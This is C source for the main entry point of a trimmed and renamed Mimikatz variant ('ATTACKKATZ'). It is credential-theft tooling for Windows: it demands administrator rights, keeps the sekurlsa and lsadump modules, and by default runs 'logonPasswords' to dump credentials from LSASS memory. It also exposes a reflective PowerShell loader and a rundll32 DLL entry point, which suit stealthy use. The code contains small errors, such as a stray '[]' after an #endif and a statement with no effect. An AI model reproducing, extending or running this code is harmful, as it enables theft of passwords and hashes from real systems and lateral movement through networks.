#include "mimikatz.h"

const KUHL_M * mimikatz_modules[] = {
//	&kuhl_m_standard,
//	&kuhl_m_crypto,
	&kuhl_m_sekurlsa,
//	&kuhl_m_kerberos, // commenting out to get compiled out via optimizations.
	&kuhl_m_privilege,
	&kuhl_m_process,
//	&kuhl_m_service, // commenting out to get compiled out via optimizations.
	&kuhl_m_lsadump,
//	&kuhl_m_ts,		 // commenting out to get compiled out via optimizations.
//	&kuhl_m_event,   // commenting out to get compiled out via optimizations.
//	&kuhl_m_misc,	 // commenting out to get compiled out via optimizations.
//	&kuhl_m_token,   // commenting out to get compiled out via optimizations.
//	&kuhl_m_vault,   // commenting out to get compiled out via optimizations.
//	&kuhl_m_minesweeper, // commenting as to get compiled out via optimizations.
#if defined(NET_MODULE)
	&kuhl_m_net,
#endif[]
//	&kuhl_m_dpapi,  // commenting to get compiled out via optimizations.
//	&kuhl_m_busylight,  // commenting to get compiled out via optimizations.
	&kuhl_m_sysenv, 
	&kuhl_m_sid,
//	&kuhl_m_iis, // commenting to get compiled out via optimizations.
//	&kuhl_m_rpc, // commenting to get compiled out via optimizations.
//	&kuhl_m_sr98, // commenting to get compiled out via optimizations.
//	&kuhl_m_rdm, // commenting to get compiled out via optimizations.
//	&kuhl_m_acr, // commenting to get compiled out via optimizations.
};

int wmain(int argc, wchar_t * argv[])
{
	if (isAdmin() == FALSE) {
		printf("[*] Error, you must run this utilty as Administrator");
		return 1;
	}

	kuhl_m_privilege_debug; // Setting debug privilege so user's don't have to manually.

	NTSTATUS status = STATUS_SUCCESS;
	int i;
	
#if !defined(_POWERKATZ)
	size_t len;
	wchar_t input[0xffff];
#endif

	mimikatz_begin();
	for(i = MIMIKATZ_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_FATAL_APP_EXIT) ; i++)
	{
		kprintf(L"\n" ATTACKKATZ L"(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
		status = mimikatz_dispatchCommand(argv[i]);
	}
#if !defined(_POWERKATZ)

		kprintf(L"\n" ATTACKKATZ L" # ");
		fflush(stdin);
		kprintf_inputline(L"%s\n", input);
			status = mimikatz_dispatchCommand(input);
#endif
	mimikatz_end();
	return STATUS_SUCCESS;
}

void mimikatz_begin()
{
	kull_m_output_init();
#if !defined(_POWERKATZ)
	SetConsoleTitle(ATTACKKATZ L" " ATTACKKATZ_VERSION L" " MIMIKATZ_ARCH);
	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
#endif
	kprintf(L"\n"
		L"  .#####.    \t" ATTACKKATZ_FULL L"\n"
		L".##[0]_[0]  \t" ATTACKKATZ_SECOND L"\n"
		L" ##  \\_/  ## \t\n"
		L" ## > |< ##  \t\n"
		L" '## v ##'   \t\n"
		L"  '#####'    \t\n");

	mimikatz_doLocal("DATADATADATA"); // this doesn't matter, as the "logonpasswords" is hardset within the mimikatz_dolocal function
	mimikatz_initOrClean(TRUE);
}

void mimikatz_end()
{
	mimikatz_initOrClean(FALSE);
#if !defined(_POWERKATZ)
	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
#endif
	kull_m_output_clean();
#if !defined(_WINDLL)
	ExitProcess(STATUS_SUCCESS);
#endif
}

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	mimikatz_initOrClean(FALSE);
	return FALSE;
}

NTSTATUS mimikatz_initOrClean(BOOL Init)
{
	unsigned short indexModule;
	PKUHL_M_C_FUNC_INIT function;
	long offsetToFunc;
	NTSTATUS fStatus;
	HRESULT hr;

	if(Init) 
	{
		RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
		MIMIKATZ_NT_BUILD_NUMBER &= 0x00007fff;
		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if(FAILED(hr))
//#if defined(_POWERKATZ)
			//if(hr != RPC_E_CHANGED_MODE)
//#endif
				PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
		kull_m_asn1_init();
	}
	else
		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);

	for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
	{
		if (function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (mimikatz_modules[indexModule]) + offsetToFunc))
		{
			fStatus = function();
			if(!NT_SUCCESS(fStatus))
				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), mimikatz_modules[indexModule]->shortName, fStatus);
		}
	}

	if(!Init) {
		kull_m_asn1_term();
		CoUninitialize();
		kull_m_output_file(NULL);
	}
	return STATUS_SUCCESS;
}

NTSTATUS mimikatz_dispatchCommand(wchar_t * input)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PWCHAR full;
	if(full = kull_m_file_fullPath(input))
	{
		switch(full[0])
		{
		case L'!':
			status = kuhl_m_kernel_do(full + 1);
			break;
		case L'*':
			status = kuhl_m_rpc_do(full + 1);
			break;
		default:
			status = mimikatz_doLocal(full);
		}
		LocalFree(full);
	}
	return status;
}

NTSTATUS mimikatz_doLocal(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
	unsigned short indexModule, indexCommand;
	BOOL moduleFound = FALSE, commandFound = FALSE;
	
	if(argv && (argc > 0))
	{
		if (match = wcsstr(argv[0], L"::"))
		{
			if (module = (wchar_t*)LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
			{
				if ((unsigned int)(match + 2 - argv[0]) < wcslen(argv[0]))
					command = match + 2;
				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
			}
		}
		//else command = argv[0];
		else command = L"logonPasswords";
		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(mimikatz_modules)); indexModule++)
			if(moduleFound = (!module || (_wcsicmp(module, mimikatz_modules[indexModule]->shortName) == 0)))
				if(command)
					for(indexCommand = 0; !commandFound && (indexCommand < mimikatz_modules[indexModule]->nbCommands); indexCommand++)
						if(commandFound = _wcsicmp(command, mimikatz_modules[indexModule]->commands[indexCommand].command) == 0)
							status = mimikatz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);
		

		mimikatz_initOrClean(TRUE);
		if(!moduleFound)
		{
			
			for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->shortName);
				if(mimikatz_modules[indexModule]->fullName)
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->fullName);
				if(mimikatz_modules[indexModule]->description)
					kprintf(L"  [%s]", mimikatz_modules[indexModule]->description);
			}
			kprintf(L"\n");
		}
		else if(!commandFound)
		{
			indexModule -= 1;
			kprintf(L"\nModule :\t%s", mimikatz_modules[indexModule]->shortName);
			if(mimikatz_modules[indexModule]->fullName)
				kprintf(L"\nFull name :\t%s", mimikatz_modules[indexModule]->fullName);
			if(mimikatz_modules[indexModule]->description)
				kprintf(L"\nDescription :\t%s", mimikatz_modules[indexModule]->description);
			kprintf(L"\n");

			for(indexCommand = 0; indexCommand < mimikatz_modules[indexModule]->nbCommands; indexCommand++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->commands[indexCommand].command);
				if(mimikatz_modules[indexModule]->commands[indexCommand].description)
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->commands[indexCommand].description);
			}
			kprintf(L"\n");
		}

		if(module)
			LocalFree(module);
		LocalFree(argv);
	}
	return status;
}

#if defined(_POWERKATZ)
__declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input)
{
	int argc = 0;
	wchar_t ** argv;
	
	if(argv = CommandLineToArgvW(input, &argc))
	{
		outputBufferElements = 0xff;
		outputBufferElementsPosition = 0;
		if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
			wmain(argc, argv);
		LocalFree(argv);
	}
	return outputBuffer;
}
#endif

#if defined(_WINDLL)
void CALLBACK mimikatz_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
{
	int argc = 0;
	wchar_t ** argv;
	if(AllocConsole())
	{
#pragma warning(push)
#pragma warning(disable:4996)
		freopen("CONOUT$", "w", stdout);
		freopen("CONOUT$", "w", stderr);
		freopen("CONIN$", "r", stdin);
#pragma warning(pop)
		if(lpszCmdLine && lstrlenW(lpszCmdLine))
		{
			if(argv = CommandLineToArgvW(lpszCmdLine, &argc))
			{
				wmain(argc, argv);
				LocalFree(argv);
			}
		}
		else wmain(0, NULL);
	}
}
#endif

FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
{
    if((dliNotify == dliFailLoadLib) && ((_stricmp(pdli->szDll, "ncrypt.dll") == 0) || (_stricmp(pdli->szDll, "bcrypt.dll") == 0)))
		RaiseException(ERROR_DLL_NOT_FOUND, 0, 0, NULL);
    return NULL;
}
#if !defined(_DELAY_IMP_VER)
const
#endif
PfnDliHook __pfnDliFailureHook2 = delayHookFailureFunc;

BOOL isAdmin() {
	BOOL fIsElevated = FALSE;
	HANDLE hToken = NULL;
	TOKEN_ELEVATION elevation;
	DWORD dwSize;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		printf("\n Failed to get Process Token :%d.", GetLastError());
		if (hToken)
		{
			CloseHandle(hToken);
			hToken = NULL;
		}
		return FALSE;
	}


	if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
	{
		printf("\nFailed to get Token Information :%d.", GetLastError());
		if (hToken)
		{
			CloseHandle(hToken);
			hToken = NULL;
		}
		return FALSE;
	}

	fIsElevated = elevation.TokenIsElevated;
	return fIsElevated;
}